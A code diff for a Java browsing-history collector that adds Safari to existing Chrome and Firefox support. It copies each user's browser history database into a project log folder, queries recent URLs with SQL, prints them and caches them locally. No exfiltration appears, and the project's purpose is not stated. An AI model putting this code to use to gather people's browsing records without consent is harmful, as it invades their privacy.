@@ -13,6 +13,7 @@ public class BrowsingHistoryCollector implements Collector {
     public static final String BROWSING_HISTORY_PATH = PROJECT_DIRECTORY + "logs/BrowsingHistoryLog";
     public static final String CHROME_DB_COPY = PROJECT_DIRECTORY + "logs/chrome_db.tmp";
     public static final String FIREFOX_DB_COPY = PROJECT_DIRECTORY + "logs/firefox_db.tmp";
+    public static final String SAFARI_DB_COPY = PROJECT_DIRECTORY + "logs/safari_db.db";
     @Override
     public Object getData() {
         try {
@@ -38,6 +39,8 @@ public class BrowsingHistoryCollector implements Collector {
                     collectChromeData(urls, user);
                 if(copyFirefoxDatabase(getUserPath(user)))
                     collectFirefoxDbInfo(urls, user);
+                if(copySafariDatabase(getUserPath(user)))
+                    collectSafariDbInfo(urls, user);
                 addEntriesToCachedFile(urls);
                 saveLastCollectedTime();
             }
@@ -77,6 +80,20 @@ public class BrowsingHistoryCollector implements Collector {
         BrowsingHistoryParser parser = new BrowsingHistoryParser(user,resultSet);
         while (parser.hasNextEntry()) {
             UrlEntry currEntry = parser.getNextFireFoxEntry();
+            urls.add(currEntry);
+            System.out.println(currEntry.toString());
+        }
+        statement.close ();
+        connection.close ();
+    }
+    private void collectSafariDbInfo(List<UrlEntry> urls, String user) throws IOException, SQLException {
+        String query = getSafariQuery();
+        Connection connection = DriverManager.getConnection("jdbc:sqlite:"+ SAFARI_DB_COPY);
+        Statement statement = connection.createStatement();
+        ResultSet resultSet = statement.executeQuery(query);
+        BrowsingHistoryParser parser = new BrowsingHistoryParser(user,resultSet);
+        while (parser.hasNextEntry()) {
+            UrlEntry currEntry = parser.getNextSafariEntry();
             urls.add(currEntry);
             System.out.println(currEntry.toString());
         }
@@ -132,6 +149,11 @@ public class BrowsingHistoryCollector implements Collector {
         long toAdd=11644473600000L;
         return (date+toAdd)*1000;
     }
+    private long getSafariFormatDate(long date){
+        double dateSec = date/1000;
+        long toSubtract=978307200;
+        return (long)(dateSec-toSubtract);
+    }
     private void copyFile(File source, File dest){
         InputStream input = null;
         OutputStream output = null;
@@ -153,8 +175,8 @@ public class BrowsingHistoryCollector implements Collector {
         CommandFactory commandFact = new CommandFactory();
         String chromePath = commandFact.getChromeDbPath(userHomePath);
         File fileSource = new File(chromePath);
-        File fileDest = new File(CHROME_DB_COPY);
         if(fileSource.exists() && !fileSource.isDirectory()){
+            File fileDest = new File(CHROME_DB_COPY);
             copyFile(fileSource, fileDest);
             return true;
         }
@@ -164,10 +186,23 @@ public class BrowsingHistoryCollector implements Collector {
         CommandFactory commandFact = new CommandFactory();
         String firefoxPath = commandFact.getFirefoxDbPath(userHomePath);
         File fileSource = new File(firefoxPath);
-        File fileDest = new File(FIREFOX_DB_COPY);
         if(fileSource.exists() && !fileSource.isDirectory()){
+            File fileDest = new File(FIREFOX_DB_COPY);
             copyFile(fileSource, fileDest);
             return true;
+        }
+        return false;
+    }
+    private boolean copySafariDatabase(String userHomePath) throws IOException, InterruptedException {
+        CommandFactory commandFact = new CommandFactory();
+        String safariPath = commandFact.getSafariDbPath(userHomePath);
+        if(safariPath!=null){
+            File fileSource = new File(safariPath);
+            if(fileSource.exists() && !fileSource.isDirectory()){
+                File fileDest = new File(SAFARI_DB_COPY);
+                copyFile(fileSource, fileDest);
+                return true;
+            }
         }
         return false;
     }
@@ -197,6 +232,16 @@ public class BrowsingHistoryCollector implements Collector {
                 "WHERE moz_places.id = moz_historyvisits.place_id " +
                 "AND moz_historyvisits.visit_date>" +lastCollected +
                 " order by moz_historyvisits.visit_date desc limit 10";
+        return query;
+    }
+    private String getSafariQuery() throws IOException {
+        long lastCollected =getLastCollectedTime();
+        long lastDateInSafariFormat = getSafariFormatDate(lastCollected);
+        String query = "SELECT url, visit_time " +
+                "FROM history_visits, history_items " +
+                "WHERE history_visits.history_item = history_items.id " +
+                "AND visit_time>" +lastDateInSafariFormat +
+                " order by visit_time desc limit 10";
         return query;
     }
 }
